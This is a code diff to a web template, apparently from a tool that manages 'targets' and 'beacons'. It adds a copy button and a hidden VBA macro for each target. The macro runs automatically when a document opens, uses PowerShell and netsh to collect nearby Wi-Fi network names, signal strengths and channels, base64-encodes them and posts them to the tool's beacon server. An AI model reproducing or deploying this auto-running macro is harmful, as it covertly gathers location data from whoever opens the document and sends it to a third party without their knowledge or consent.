@@ -13,6 +13,19 @@
     {% endif %}
     <div class="row">
         <div class="u-full-width center-content targets">
+        <script>
+            function copy_macro(target_guid) {
+                alert("The macro should be copied to the clipboard.\n\nIf not, simply copy and paste this into your document:\n\n" + document.getElementById(target_guid).innerText);
+                copyText = document.getElementById(target_guid).textContent;
+                textArea = document.createElement('textarea');
+                textArea.setAttribute("id", "temptext");
+                textArea.textContent = copyText;
+                document.body.append(textArea);
+                textArea.select();
+                document.execCommand("copy");
+                document.getElementById('temptext').remove();
+            }
+        </script>
         {% if targets|length > 0 %}
             <table class="sortable center">
                 <thead>
@@ -30,6 +43,26 @@
                         <td>{{ target[column] }}</td>
                     {% endfor %}
                         <td>
+                            <pre hidden id="{{ target.guid }}"><code>Sub AutoOpen()
+    Set objWSH = CreateObject("WScript.Shell")
+    wifi = objWSH.Exec("powershell netsh wlan show networks mode=bssid | findstr 'SSID Signal Channel'").StdOut.ReadAll
+
+    Open Environ("temp") & "\wifidat.txt" For Output As #1
+        Print #1, wifi
+    Close #1
+
+    wifi = objWSH.Exec("powershell Get-Content %TEMP%\wifidat.txt -Encoding UTF8 -Raw").StdOut.ReadAll
+
+    Kill Environ("temp") & "\wifidat.txt"
+
+    wifienc = objWSH.Exec("powershell -Command ""& {[System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes('" & wifi & "'))}""").StdOut.ReadAll
+
+    Set objHTTP = CreateObject("MSXML2.ServerXMLHTTP")
+    objHTTP.Open "POST", "{{ request.url_root }}api/beacon/{{ target.guid }}/VBA"
+    objHTTP.setRequestHeader "Content-Type", "application/x-www-form-urlencoded"
+    objHTTP.Send "os=windows&data=" & wifienc
+End Sub</code></pre>
+                            <input type="button" onclick="copy_macro('{{ target.guid }}')" value="macro"/>
                             <input type="button" onclick="window.open('{{ url_for('demo', guid=target.guid) }}', '_blank')" value="demo" />
                         {% if g.user.is_admin %}
                             <input type="button" onclick="if (confirm('Are you sure you want to delete this target and all of its beacons?')) { window.location='{{ url_for('target_delete', guid=target.guid) }}' }" value="delete" />
